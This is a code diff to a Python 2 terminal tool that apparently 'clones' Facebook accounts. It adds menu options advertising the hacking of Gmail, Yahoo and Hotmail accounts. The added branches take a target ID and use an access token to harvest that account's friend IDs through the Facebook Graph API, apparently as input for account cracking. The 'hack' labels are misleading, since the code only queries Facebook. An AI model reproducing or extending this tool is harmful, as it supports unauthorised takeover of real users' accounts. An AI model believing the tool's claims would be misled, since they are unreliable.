@@ -248,12 +248,11 @@ def super():
 	print logo
 	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m1.\x1b[1;95mClone From Friend List (Direct Shoot)."
 	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m2.\x1b[1;95mClone From Public ID (To Clone More)."
-	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m3.\x1b[1;95mHack Any Target Account (Upload Soon)."
-	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m4.\x1b[1;95mHack Any Gmail Account (Upload Soon)."
-	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m5.\x1b[1;95mHack Any Yahoo Account (Upload Soon)."
-	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m6.\x1b[1;95mHack Any Hotmail Account (Upload Soon)."
-	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m7.\x1b[1;95mHack Whatsapp Acount(Upload Soon)."
-	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m8.\x1b[1;95mContact me Arbab Memon(03003023263)."
+	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m3.\x1b[1;95mHack Any Gmail Account (Hack Gmail)."
+	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m4.\x1b[1;95mHack Any Yahoo Account (Hack Yahoo)."
+	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m5.\x1b[1;95mHack Any Hotmail Account (Hack Hotmail)."
+	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m6.\x1b[1;95mHack Whatsapp Acount(Upload Soon)."
+	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m7.\x1b[1;95mContact me Arbab Memon(03003023263)."
 	print "\033[1;92m-•◈•-\033[1;91m> \033[1;91m0.\033[1;94mBack"
 	pilih_super()
 
@@ -285,6 +284,60 @@ def pilih_super():
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
 		print"\033[1;93mGetting IDs\033[1;92m..."
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif peak =="3":
+		os.system('clear')
+		print logo
+		idt = raw_input("\033[1;96m[•◈•] \033[1;92mEnter Gmail\033[1;93m: \033[1;97m")
+		print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mArbab.Memon\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
+		except KeyError:
+			print"\x1b[1;92mID Not Found!"
+			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+			super()
+		print"\033[1;93mGetting Gmail in Numbers\033[1;92m..."
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif peak =="4":
+		os.system('clear')
+		print logo
+		idt = raw_input("\033[1;96m[•◈•] \033[1;92mEnter Yahoo\033[1;93m: \033[1;97m")
+		print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mArbab.Memon\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
+		except KeyError:
+			print"\x1b[1;92mID Not Found!"
+			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+			super()
+		print"\033[1;93mGetting Yahoo in Numbers\033[1;92m..."
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif peak =="5":
+		os.system('clear')
+		print logo
+		idt = raw_input("\033[1;96m[•◈•] \033[1;92mEnter Hotmail\033[1;93m: \033[1;97m")
+		print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mArbab.Memon\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
+		except KeyError:
+			print"\x1b[1;92mID Not Found!"
+			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+			super()
+		print"\033[1;93mGetting Hotmail\033[1;92m..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
